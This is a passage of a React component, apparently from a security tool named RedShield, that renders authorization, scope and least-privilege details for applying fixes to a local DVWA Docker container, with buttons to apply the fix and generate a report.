                        <div className="flex justify-between">
                          <span className="text-gray-400">Connection:</span>
                          <span className="text-yellow-400">docker exec dvwa mysql</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Credentials Used:</span>
                          <span className="text-red-400">root:p@ssw0rd (DVWA default)</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Credential Source:</span>
                          <span className="text-purple-400">Container's default config</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Authorization:</span>
                          <span className="text-green-400">Root access via container exec</span>
                        </div>
                      </div>
                      <div className="mt-3 p-3 bg-amber-500/10 border border-amber-500/30 rounded-lg">
                        <p className="text-amber-400 text-sm"><strong>⚠️ Note:</strong> In production, this would require proper database credentials provided by the system owner.</p>
                      </div>
                    </div>
                  ) : null}

                  {/* Filesystem Access (for code fixes) */}
                  {selectedVuln?.vuln_type.toUpperCase().includes('SQL') || selectedVuln?.vuln_type.toUpperCase().includes('XSS') || selectedVuln?.vuln_type.toUpperCase().includes('COMMAND') ? (
                    <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                      <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                        <FileText className="w-5 h-5 text-orange-400" />Filesystem Access
                      </h3>
                      <div className="bg-[#0d1117] rounded-lg p-4 font-mono text-sm space-y-2">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Access Method:</span>
                          <span className="text-cyan-400">Direct file write via docker exec</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Target Path:</span>
                          <span className="text-yellow-400">/var/www/html/vulnerabilities/...</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Permission:</span>
                          <span className="text-gray-300">Write access to web root (www-data)</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Authorization:</span>
                          <span className="text-green-400">Container admin (Docker group membership)</span>
                        </div>
                      </div>
                      <div className="mt-3 p-3 bg-amber-500/10 border border-amber-500/30 rounded-lg">
                        <p className="text-amber-400 text-sm"><strong>⚠️ Note:</strong> In production, this would require SSH/SFTP access with deployment credentials.</p>
                      </div>
                    </div>
                  ) : null}

                  {/* Scope Limitation */}
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                      <AlertTriangle className="w-5 h-5 text-yellow-400" />Scope Limitation
                    </h3>
                    <div className="bg-[#0d1117] rounded-lg p-4 font-mono text-sm space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Target Scope:</span>
                        <span className="text-green-400">Local Docker container only</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Network Scope:</span>
                        <span className="text-cyan-400">localhost:8888</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Remote Target:</span>
                        <span className="text-gray-300">Read-only scan (no modification attempted)</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Production Note:</span>
                        <span className="text-purple-400">Would require proper change management</span>
                      </div>
                    </div>
                  </div>

                  {/* Fix Preconditions */}
                  <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-5">
                    <h3 className="text-green-400 font-semibold mb-4 flex items-center gap-2">
                      <CheckCircle className="w-5 h-5" />Fix Preconditions (Least Privilege Check)
                    </h3>
                    <ul className="space-y-2">
                      <li className="flex items-center gap-2 text-gray-300 text-sm">
                        <Check className="w-4 h-4 text-green-400" />
                        <span><strong>Required Privilege:</strong> {selectedVuln?.vuln_type.toUpperCase().includes('DEFAULT') ? 'Database write (users table)' : 'Filesystem write (web root)'}</span>
                      </li>
                      <li className="flex items-center gap-2 text-gray-300 text-sm">
                        <Check className="w-4 h-4 text-green-400" />
                        <span><strong>Required Access:</strong> Container admin via Docker</span>
                      </li>
                      <li className="flex items-center gap-2 text-gray-300 text-sm">
                        <Check className="w-4 h-4 text-green-400" />
                        <span><strong>Required Scope:</strong> Local container only</span>
                      </li>
                      <li className="flex items-center gap-2 text-green-400 text-sm font-semibold">
                        <CheckCircle className="w-4 h-4" />
                        <span>All preconditions verified ✅</span>
                      </li>
                    </ul>
                  </div>

                  {/* Authorization Summary */}
                  <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-5">
                    <h3 className="text-blue-400 font-semibold mb-3">📋 Authorization Summary</h3>
                    <p className="text-gray-300 text-sm leading-relaxed">
                      This fix was applied using <strong className="text-cyan-400">legitimate local access</strong> to a Docker container running on the same machine as the RedShield tool. 
                      The tool used the user's existing Docker privileges (docker group membership) to execute commands inside the container. 
                      <strong className="text-yellow-400"> No remote access or external credentials were used.</strong> 
                      In a production environment, equivalent fixes would require: (1) SSH/SFTP access with deployment credentials, (2) Change management approval, (3) Backup procedures.
                    </p>
                  </div>
                </div>
              )}

              <div className="flex gap-4">
                {!fixComplete ? (
                  <button onClick={runFix} disabled={isFixing}
                    className={`flex-1 py-4 rounded-xl font-semibold text-lg flex items-center justify-center gap-3 ${isFixing ? 'bg-gray-700 text-gray-400 cursor-not-allowed' : 'bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white'}`}>
                    {isFixing ? <><Loader2 className="w-6 h-6 animate-spin" />Applying Fix...</> : <><Play className="w-6 h-6" />Apply Fix Now</>}
                  </button>
                ) : (
                  <div className="flex-1 flex gap-4">
                    <div className="flex-1 py-4 rounded-xl font-semibold text-lg flex items-center justify-center gap-3 bg-green-500/20 text-green-400 border border-green-500/50"><CheckCircle className="w-6 h-6" />Fix Applied!</div>
                    <button onClick={() => navigate('/report-generator')} className="px-6 py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-semibold flex items-center gap-2"><FileText className="w-5 h-5" />Generate Report</button>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
